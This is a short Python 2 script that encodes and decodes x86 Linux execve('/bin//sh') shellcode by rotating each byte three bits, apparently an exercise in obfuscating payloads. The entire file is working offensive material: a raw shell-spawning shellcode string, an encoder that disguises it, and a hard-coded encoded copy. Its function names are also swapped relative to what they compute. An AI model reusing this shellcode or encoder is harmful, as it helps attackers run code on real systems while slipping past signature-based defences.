import sys
def rotateLeft(num,rotate):
    num1 = 0
    while(rotate):
        result = num & 1
        if(result == 1):
            num1 = num1 | 128    
        num1 = num1 >> 1
        num = num >> 1
        rotate -= 1
    num1 = num1 << 1
    return num | num1

def rotateRight(num,rotate):
    num1 = 0
    while(rotate):
        result = num & 128
        if(result >0):
            num1 = num1 | 1
        num1 = num1 << 1
        num = num << 1
        rotate -= 1
        num = num & 255
        num1 = num1 & 255
    num1 = num1 >> 1
    return num | num1


shellcode=("\x31\xd2\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
encoder=""
for x in bytearray(shellcode):
    temp = rotateLeft(x,3)
    encoder += '\\x'
    encoder += '%02x' % temp
print "Encoder = ",encoder

encoder=("\x26\x5a\x26\x39\xfe\x3c\x0a\x0d\xcd\xe5\x6e\x0d\x0d\xe5\xe5\x4c\x2d\x31\x7c\x0a\x6a\x31\x3c\x16\x61\xb9\x10")
decoder=""
for x in bytearray(encoder):
    temp = rotateRight(x,3)
    decoder += '\\x'
    decoder += '%02x' % temp
print "decoded = ",decoder

